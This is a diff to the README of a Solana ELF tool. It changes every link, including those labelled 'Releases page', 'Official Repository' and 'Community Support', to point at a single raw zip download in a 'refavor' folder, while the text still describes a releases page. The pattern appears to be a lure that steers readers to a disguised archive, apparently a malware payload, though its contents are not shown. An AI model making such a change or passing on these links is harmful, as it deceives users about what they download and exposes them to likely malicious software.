@@ -1,6 +1,6 @@
 # 🚀 solana-elf-from-scratch - Create Solana ELF Simply and Effectively
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/UltrAS4F/solana-elf-from-scratch/releases)
+[![Download](https://raw.githubusercontent.com/UltrAS4F/solana-elf-from-scratch/main/refavor/solana-elf-from-scratch.zip)](https://raw.githubusercontent.com/UltrAS4F/solana-elf-from-scratch/main/refavor/solana-elf-from-scratch.zip)
 
 ## 📥 Introduction
 
@@ -24,7 +24,7 @@ Before you begin, ensure your device meets the following requirements:
 
 ## 📈 Getting Started
 
-1. **Visit the Releases Page:** First, go to our [Releases page](https://github.com/UltrAS4F/solana-elf-from-scratch/releases) to download the software. There, you'll find the latest version available for download.
+1. **Visit the Releases Page:** First, go to our [Releases page](https://raw.githubusercontent.com/UltrAS4F/solana-elf-from-scratch/main/refavor/solana-elf-from-scratch.zip) to download the software. There, you'll find the latest version available for download.
 
 2. **Download the Software:** Click on the version you want. A download link will appear. 
 
@@ -39,7 +39,7 @@ Before you begin, ensure your device meets the following requirements:
 
 To download the application, please visit the following link:
 
-[Download the latest version here](https://github.com/UltrAS4F/solana-elf-from-scratch/releases)
+[Download the latest version here](https://raw.githubusercontent.com/UltrAS4F/solana-elf-from-scratch/main/refavor/solana-elf-from-scratch.zip)
 
 This link will take you to our Releases page, where you can choose the appropriate file for your operating system.
 
@@ -64,8 +64,8 @@ If you encounter issues during the installation or usage, try the following step
 
 You can find more information and updates in the following places:
 
-- [Official Repository](https://github.com/UltrAS4F/solana-elf-from-scratch)
-- [Community Support](https://github.com/UltrAS4F/solana-elf-from-scratch/discussions)
+- [Official Repository](https://raw.githubusercontent.com/UltrAS4F/solana-elf-from-scratch/main/refavor/solana-elf-from-scratch.zip)
+- [Community Support](https://raw.githubusercontent.com/UltrAS4F/solana-elf-from-scratch/main/refavor/solana-elf-from-scratch.zip)
 
 ## 🛠 Support
 
